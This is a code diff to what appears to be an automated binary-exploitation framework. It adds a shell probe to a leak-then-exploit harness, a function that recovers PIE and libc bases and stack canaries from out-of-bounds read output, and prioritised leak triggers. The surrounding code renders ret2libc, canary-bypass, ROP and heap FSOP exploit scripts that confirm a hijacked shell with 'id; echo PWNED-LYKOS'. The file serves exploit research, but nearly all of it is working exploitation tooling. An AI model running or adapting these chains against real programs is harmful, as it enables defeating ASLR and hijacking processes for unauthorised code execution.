@@ -8,6 +8,7 @@ success marker. The analyst supplies what the target leaks and how success shows
 """
 from __future__ import annotations
 
+import logging
 import os
 import re
 import select
@@ -16,7 +17,10 @@ import subprocess
 import time
 from pathlib import Path
 
+from ... import observe
 from ..dynamic import sandbox
+
+_log = logging.getLogger(__name__)
 
 
 def _kill(p):
@@ -40,7 +44,8 @@ def _kill(p):
 
 def leak_and_exploit(exe, base_argv, *, leak_regex: str, leak_base_offset=None,
                      payload_for_base, success_regex: str, timeout: float = 8.0,
-                     mem_mb: int = 2048, base_from_leaks=None, leak_trigger: bytes = b"") -> dict:
+                     mem_mb: int = 2048, base_from_leaks=None, leak_trigger: bytes = b"",
+                     shell_probe: bytes = b"") -> dict:
     """Interactive single-process leak → relocate → exploit over stdin/stdout.
 
     Two ways to turn the leak into an image base:
@@ -51,13 +56,27 @@ def leak_and_exploit(exe, base_argv, *, leak_regex: str, leak_base_offset=None,
         so the analyst need not say which symbol is leaked.
     `payload_for_base(base)->bytes` builds the relocated payload. Success = `success_regex`
     appears in the post-payload output.
+
+    `shell_probe` is a command to send AFTER the payload, for the case the hijack lands in a
+    `win()` that execve's a shell -- by far the commonest shape. Such a win prints NOTHING of its
+    own, so a marker regex can never match it, and this function made that unobservable twice
+    over: it closed stdin right after the payload, so the shell it had just spawned read EOF and
+    exited without ever running anything. With a probe, stdin stays open, the command goes in,
+    and the caller grades the reply (`attribution.CodeMarkers.proves`, which an echoing target
+    cannot fake). The only thing that changes without a probe is nothing at all.
     """
     if leak_base_offset is None and base_from_leaks is None:
         raise ValueError("leak_and_exploit needs exactly one of leak_base_offset= "
                          "or base_from_leaks= (got neither)")
     rx = re.compile(leak_regex.encode("latin-1"))
     ok = re.compile(success_regex.encode("latin-1"))
-    preexec = sandbox._rlimits(mem_mb, int(timeout) + 2, set_as=True)
+    # ASLR ON, uniquely among this file's harnesses. This function's whole contract is leak ->
+    # relocate -> exploit: the payload is computed from the base THIS process disclosed, so it
+    # needs no fixed address and a randomized child is the only honest test of the claim it
+    # files ("defeated ASLR"). The others here stay as they are on purpose -- some are not
+    # leak-relative (a stack-address shellcode chain), and switching them blind would trade a
+    # working capability for a cosmetic one.
+    preexec = sandbox._rlimits(mem_mb, int(timeout) + 2, set_as=True, aslr=True)
     # The leak harness reads only the target's stdout, so it needs no control channel: contain
     # it fully (read-only fs, tmpfs, private pid + network namespace) when bwrap is available.
     exedir = str(Path(exe).resolve().parent)
@@ -138,7 +157,23 @@ def leak_and_exploit(exe, base_argv, *, leak_regex: str, leak_base_offset=None,
         try:
             p.stdin.write(payload)
             p.stdin.flush()
-            p.stdin.close()
+            if shell_probe:
+                # KEEP stdin open and feed the probe. Closing it is right when the win prints a
+                # marker and wrong when the win IS a shell: that shell inherits this pipe, and an
+                # immediate EOF is an immediate exit with nothing on stdout.
+                time.sleep(0.3)                          # let the hijack land and exec
+                # A LEADING newline, because the payload is padded. `ret2win_input` fills to a
+                # fixed length after the return address, and those filler bytes are still in the
+                # pipe when the hijacked process execs a shell -- which reads them as the start
+                # of its first line, so the probe arrived as `CCCCCCecho ...` and came back
+                # `sh: 1: CCCCCCecho: not found` **[measured]**. The shell was real and the
+                # evidence was unreadable, which grades as "the marker was not observed" -- the
+                # same verdict as no shell at all. One newline ends the junk line.
+                p.stdin.write(b"\n" + (shell_probe if shell_probe.endswith(b"\n")
+                                       else shell_probe + b"\n"))
+                p.stdin.flush()
+            else:
+                p.stdin.close()
         except (BrokenPipeError, OSError):
             pass
 
@@ -165,7 +200,7 @@ def leak_and_exploit(exe, base_argv, *, leak_regex: str, leak_base_offset=None,
         try:
             p.wait(timeout=2)
         except Exception:
-            pass
+            observe.absorbed(_log, "continuing")
 
 
 def render_ret2win_script(leak_regex, leak_base_offset, off_win, offset) -> bytes:
@@ -262,7 +297,8 @@ def render_canary_script(*, canary_offset, ret_offset, canary_trigger, pop_rdi, 
         "    except (BrokenPipeError, OSError): p.kill(); continue\n"
         "    out=read_until(p, time.time()+6, quiet=1.5)\n"
         "    if b'PWNED-LYKOS' in out:\n"
-        "        print('shell (canary %#x, libc base %#x):'%(canary,base)); print(out.decode('latin-1','ignore')); sys.exit(0)\n"
+        "        print('shell (canary %#x, libc base %#x):'%(canary,base)); "
+        "print(out.decode('latin-1','ignore')); sys.exit(0)\n"
         "    p.kill()\n"
         "sys.stderr.write('canary ret2libc did not confirm\\n'); sys.exit(1)\n"
     ).encode()
@@ -742,9 +778,8 @@ def orw_leak(exe, workdir, *, offset, pop_rdi, pop_rsi, pop_rdx, puts_plt, puts_
     seccomp filter blocks execve so system("/bin/sh") can never confirm. Confirmation is the
     DISCLOSURE itself -- `flag_marker` (planted only in the file, never sent as input) appearing in
     the output proves the chain opened+read the file. Returns {ok, base, disclosed}."""
-    import struct as _struct
+
     from . import rop
-    q = lambda v: _struct.pack("<Q", v & 0xFFFFFFFFFFFFFFFF)      # noqa: E731
     exedir = str(Path(exe).resolve().parent)
     argv = [str(a) for a in base_argv]
     path_blob = (flag_path if isinstance(flag_path, (bytes, bytearray)) else flag_path.encode()) + b"\x00"
@@ -974,7 +1009,7 @@ def discover_canary_offset(exe, workdir, *, canary_trigger=b"", base_argv=(), ti
 def canary_ret2libc(exe, workdir, *, offset, canary_offset, ret_offset, canary_trigger,
                     pop_rdi, puts_plt, puts_got, ret_to, puts_off, system_off, binsh_off,
                     ret_gadget=None, canary_index=None, canary_regex: str = r"0x[0-9a-fA-F]+",
-                    loop_feed: bytes = None, base_argv=(), marker: bytes = b"LYKOS-CAN-9931",
+                    loop_feed: bytes | None = None, base_argv=(), marker: bytes = b"LYKOS-CAN-9931",
                     timeout: float = 8.0, mem_mb: int = 2048) -> dict:
     """ret2libc on a stack-canary-protected no-PIE target. A canary is a per-process random word
     between the buffer and the saved return; overflowing past it trips __stack_chk_fail unless the
@@ -1099,9 +1134,9 @@ def _replay_over_read(p, sel, *, leak_recipe, canary_trigger, canary_index, cana
     import re as _re
     import struct as _struct
 
+    from ..fuzz import menu as _menu
     from . import exploit as _exploit
     from . import rop
-    from ..fuzz import menu as _menu
     rx = _re.compile(canary_regex.encode("latin-1"))
     dump = b""
     try:
@@ -1153,7 +1188,7 @@ def _replay_over_read(p, sel, *, leak_recipe, canary_trigger, canary_index, cana
 
 def canary_pie_ret2win(exe, workdir, *, canary_trigger=b"", canary_offset=None, ret_offset=None,
                        win_off, target_bytes, leak_recipe=None, canary_index=None,
-                       canary_regex: str = r"0x[0-9a-fA-F]+", loop_feed: bytes = None, base_argv=(),
+                       canary_regex: str = r"0x[0-9a-fA-F]+", loop_feed: bytes | None = None, base_argv=(),
                        marker: bytes = b"LYKOS-PCW-9931", timeout: float = 8.0,
                        mem_mb: int = 2048) -> dict:
     """ret2win on a PIE + stack-canary target with an in-binary win (a function that spawns a shell
@@ -1165,14 +1200,10 @@ def canary_pie_ret2win(exe, workdir, *, canary_trigger=b"", canary_offset=None, 
     (`build_canary_prefix`) and returns to `win_off + pie_base`. Confirmed by a spawned shell
     echoing `marker` (a win that execve's a shell) OR the win's own output containing the marker.
     Returns {ok, canary, pie_base, win} or {ok: False, reason}."""
-    import re as _re
     import struct as _struct
 
-    from . import exploit as _exploit
     from . import rop
-    rx = _re.compile(canary_regex.encode("latin-1"))
     q = lambda v: _struct.pack("<Q", v & 0xFFFFFFFFFFFFFFFF)      # noqa: E731
-    feed = canary_trigger if loop_feed is None else loop_feed
     exedir = str(Path(exe).resolve().parent)
     argv = [str(a) for a in base_argv]
 
@@ -1234,6 +1265,8 @@ def canary_pie_ret2win(exe, workdir, *, canary_trigger=b"", canary_offset=None, 
                     p.stdin.flush()
                     # re-entered read (if the overflow returns through a loop) then provoke output
                     time.sleep(0.2)
+                    if loop_feed:
+                        p.stdin.write(loop_feed)      # satisfy the loop's own read first
                     p.stdin.write(b"echo " + marker + b"\n")
                     p.stdin.flush()
                 except (BrokenPipeError, OSError):
@@ -1433,8 +1466,8 @@ def canary_pie_ret2libc(exe, workdir, *, target_bytes, libc_data, pop_rdi_off, s
     import selectors as _selectors
     import struct as _struct
 
-    from . import rop
     from ..fuzz import menu as _menu
+    from . import rop
     q = lambda v: _struct.pack("<Q", v & 0xFFFFFFFFFFFFFFFF)      # noqa: E731
     exedir = str(Path(exe).resolve().parent)
     argv = [str(a) for a in base_argv]
@@ -1675,6 +1708,116 @@ def classify_leak(vals, target_bytes: bytes, libc_data: bytes = b"") -> dict:
     }
 
 
+def disclosed_bases(output: bytes, target_bytes: bytes, libc_data: bytes = b"", *,
+                    baseline: bytes = b"") -> dict:
+    """What an out-of-bounds READ proves about ASLR, from the program's OWN output.
+
+    This is the rung an OOB read was missing. `oob_access_primitive` already shows the access is
+    out of bounds and that the attacker chooses HOW FAR -- an L2 disclosure primitive. What it
+    could not say is whether the disclosed bytes are worth anything, and the answer decides
+    everything downstream: adjacent heap memory full of pointers defeats ASLR, and adjacent
+    memory full of pixel data does not.
+
+    TWO facts about the physics, both of which shape this:
+
+    1. **The build that FINDS the bug cannot DEMONSTRATE the leak.** On an ASan build the process
+       aborts inside the read, so nothing reaches stdout or the output file. The disclosure is
+       observable only where the read SUCCEEDS -- the uninstrumented build. So the caller detonates
+       twice, on purpose, and these are the bytes from the second run.
+
+    2. **No output differencing is needed, and that matters.** The uninitialised-memory class was
+       measured to be undecidable that way (see the uninit oracle: libc-laundered vs intercepted),
+       because one run's garbage looks like another's. A POINTER is different: its low 12 bits are
+       page-invariant under ASLR, so a leaked image pointer's `& 0xfff` equals the page offset of
+       whatever symbol it points at, and `recover_pie_base` / `rop.recover_libc_base` accept a base
+       only when two DISTINCT slots corroborate it. A value that resolves to this binary's own
+       symbol layout is not a coincidence, so the leak validates ITSELF against the target --
+       `baseline` is used only to report how many bytes were EXTRA, never as the oracle.
+
+    Both renderings are harvested: raw little-endian words (a binary over-read echoes memory
+    verbatim) and hex text (a program that prints what it read through `%p`/`%x`).
+
+    Returns {pointers, pie_base, libc_base, canary, proved, disclosed_bytes, note}. `proved` is
+    True only when a base was corroborated -- which is the whole claim.
+    """
+    from . import rop
+    from .exploit import recover_pie_base
+    # RAW WORDS FIRST, case-fold variants only if they find nothing. The variants exist for a
+    # leak the viewer put through toupper/tolower, where the real pointer is unreadable without
+    # them -- but each one is a near-miss of a real pointer with the SAME low 12 bits, so it
+    # proposes a different base that is just as well anchored. Mixing them in unconditionally
+    # therefore broke the uniqueness the single-slot rule depends on: measured on a binary heap
+    # over-read, the raw words recovered the true PIE base 8/8 and adding the variants recovered
+    # it 3/8, with 1-3 phantom bases per run. The docstring of `_case_fold_pointer_candidates`
+    # asserts the bogus variants "fail corroboration", and against the two-slot rule they do;
+    # against the single-slot rule they do the opposite, which is what went unnoticed.
+    raw = list(_le_pointer_words(output, cap=4096))
+    folded = [v for v in _case_fold_pointer_candidates(output) if v not in raw]
+    vals = raw + folded
+    # STRICT first: two distinct slots corroborating one base. Then the unambiguous-single rule,
+    # because a heap over-read is not a stack over-read. A stack dump hands over a dozen
+    # different slots; a heap neighbour commonly holds ONE distinctive pointer repeated at a
+    # fixed stride -- 32 copies of `stdout`, or of `&main`, are one slot and not thirty two. The
+    # two-slot rule therefore rejects leaks that are in fact unambiguous, and uniqueness of the
+    # page-offset match across the image (or the curated libc anchors) is what makes accepting
+    # them safe rather than optimistic. Measured on a PIE fixture over 5 runs under real ASLR:
+    # the single-slot rule recovered the TRUE load base 5/5 times.
+    rule = None
+    pie = libc = None
+    for pool, folded_in in ((raw, False), (vals, True)):
+        if folded_in and not folded:
+            break                                    # nothing to add; the first pass was final
+        if not pool:
+            continue
+        if pie is None:
+            pie = recover_pie_base(pool, target_bytes)
+            if pie:
+                rule = rule or ("corroborated" if not folded_in else "corroborated-case-folded")
+        if libc is None and libc_data:
+            libc = rop.recover_libc_base(pool, libc_data)
+            if libc:
+                rule = rule or ("corroborated" if not folded_in else "corroborated-case-folded")
+        if pie is None:
+            pie = recover_pie_base(pool, target_bytes, allow_single=True)
+            if pie:
+                rule = rule or ("unambiguous-single" if not folded_in
+                                else "unambiguous-single-case-folded")
+        if libc is None and libc_data:
+            libc = rop.recover_libc_base(pool, libc_data, allow_single=True)
+            if libc:
+                rule = rule or ("unambiguous-single" if not folded_in
+                                else "unambiguous-single-case-folded")
+        if pie and libc:
+            break
+    canary = rop.find_canary(vals) if vals else None
+    extra = max(0, len(output) - len(baseline)) if baseline else None
+    proved = bool(pie or libc)
+    if proved:
+        what = ", ".join(x for x in (
+            f"PIE base {pie:#x}" if pie else "",
+            f"libc base {libc:#x}" if libc else "",
+            f"stack canary {canary:#x}" if canary else "") if x)
+        how = ("two independent leaked slots corroborate it"
+               if (rule or "").startswith("corroborated")
+               else "one leaked slot whose page offset matches exactly one symbol, so it is "
+                    "unambiguous")
+        if (rule or "").endswith("-case-folded"):
+            how += (", recovered after un-folding a case-transformed echo (the raw bytes alone "
+                    "resolved nothing)")
+        note = (f"the out-of-bounds read disclosed live pointers into the program's own output: "
+                f"{what} -- {how}. ASLR is defeated from the leak alone")
+    elif vals:
+        note = (f"{len(vals)} pointer-shaped word(s) reached the output but none corroborated a "
+                f"base (a single match is coincidence at this anchor count), so the disclosure "
+                f"is real and its contents are not yet usable")
+    else:
+        note = ("the read is out of bounds but what it disclosed carries no pointer, so it "
+                "discloses data rather than defeating ASLR")
+    return {"pointers": vals[:32], "distinct": len(set(vals)), "pie_base": pie,
+            "libc_base": libc, "canary": canary, "proved": proved, "rule": rule,
+            "disclosed_bytes": extra, "note": note}
+
+
 def _gate_preambles(target_bytes=b"", strings=(), known_inputs=(), cap=6) -> list:
     """Candidate byte strings that pass a program's INPUT GATE, so a leak trigger sent AFTER them
     actually reaches the leaking sink.
@@ -1723,12 +1866,26 @@ def _gate_preambles(target_bytes=b"", strings=(), known_inputs=(), cap=6) -> lis
 
 def auto_provoke_leak(exe, workdir, target_bytes, libc_data=b"", *, base_argv=(), timeout=6.0,
                       mem_mb=2048, read_cap=64, strings=(), known_inputs=(),
-                      drive_prompts=False, deadline=None) -> dict:
+                      drive_prompts=False, deadline=None, extra_triggers=()) -> dict:
     """Best-effort automatic leak: drive the target with a format-string `%p` dump (sequential that
     fits `read_cap`, then positional to reach deeper slots) and classify what comes back. Returns
     the classification plus the winning trigger, or empties when nothing was disclosed (the target
     has no format-string sink, or none reachable). Pure provocation -- a target with no printf(user)
-    just echoes the specifier as text and classify_leak finds nothing."""
+    just echoes the specifier as text and classify_leak finds nothing.
+
+    `extra_triggers` are inputs a previous stage PROVED disclose memory, and they are tried first.
+    The sweep below is speculative by construction -- `%p` dumps and runs of `A` -- so it finds a
+    leak only where an unstructured write reaches the sink. An out-of-bounds READ confirmed at L2
+    is the opposite: a specific, often structured input (a length field, a `key=`, an index past
+    the end) measured against the live target, which this list would never synthesise. Seeding it
+    here rather than handing this stage a RECOVERED BASE is deliberate: a base from an earlier
+    process is stale the moment that process exits, so the caller gets the recipe and re-recovers
+    the base live, which is what makes the recon cacheable at all.
+
+    Delivery is over stdin for every trigger, seeded or not, which is this function's contract and
+    its limit: an out-of-bounds read reached through a FILE argument is recorded by L2 and cannot
+    be replayed here. That is the remaining gap in this handoff, not a silent failure -- the
+    caller filters by the channel L2 measured."""
     import re as _re
     hexrx = _re.compile(rb"0x[0-9a-fA-F]+")
     exedir = str(Path(exe).resolve().parent)
@@ -1740,6 +1897,10 @@ def auto_provoke_leak(exe, workdir, target_bytes, libc_data=b"", *, base_argv=()
     # format-string sink at all, and the old harness threw the pre-trigger banner away and only ever
     # classified a %p dump. The format-string provocations follow for a printf(user) sink.
     triggers = [b""]
+    # PROVEN first. A seeded trigger has already been observed to disclose memory on this very
+    # target, so paying for the speculative list before it wastes the deadline the sweep is
+    # bounded by -- and on a target with no format sink that list costs its full timeout each.
+    triggers += [t for t in extra_triggers if isinstance(t, bytes) and t]
     triggers += [seq[:read_cap] + b"\n"]
     triggers += [(b"|".join(b"%%%d$p" % i for i in range(a, a + 12)) + b"\n")[:read_cap] + b"\n"
                  for a in (7, 19, 31)]
@@ -1992,7 +2153,8 @@ def render_heap_script(*, menu_ops, unsorted_off, stdout_off, wfile_jumps_off, s
         "p.stdin.write(b'id; echo PWNED-LYKOS\\n'); p.stdin.flush()\n"
         "out=read_until(p, time.time()+8, quiet=1.5)\n"
         "if b'PWNED-LYKOS' in out or b'uid=' in out:\n"
-        "    print('shell (libc base %#x, heap %#x):'%(base,heap)); print(out.decode('latin-1','ignore')); sys.exit(0)\n"
+        "    print('shell (libc base %#x, heap %#x):'%(base,heap)); "
+        "print(out.decode('latin-1','ignore')); sys.exit(0)\n"
         "sys.stderr.write('heap -> shell did not confirm\\n'); sys.exit(1)\n"
     ).encode()
 
@@ -2295,7 +2457,7 @@ def heap_fsop_exploit(exe, workdir, *, add, free, view, edit, exit_seq, libc_dat
     desyncs the menu (the stray byte is read as the next option) and usually exits the target, so the
     second strategy cannot share the first one's process. Returns {ok, libc_base, heap_page,
     strategy, fill_size, ...}; `strategy`/`fill_size` tell the caller what to put in the reproducer."""
-    from . import heap as _heap                         # this wrapper is NOT inside _heap_fsop_attempt
+    from . import heap as _heap  # this wrapper is NOT inside _heap_fsop_attempt
     kw = dict(add=add, free=free, view=view, edit=edit, exit_seq=exit_seq, libc_data=libc_data,
               unsorted_off=unsorted_off, poison_size=poison_size, guard_size=guard_size,
               fill_size=fill_size, marker=marker, timeout=timeout, base_argv=base_argv,
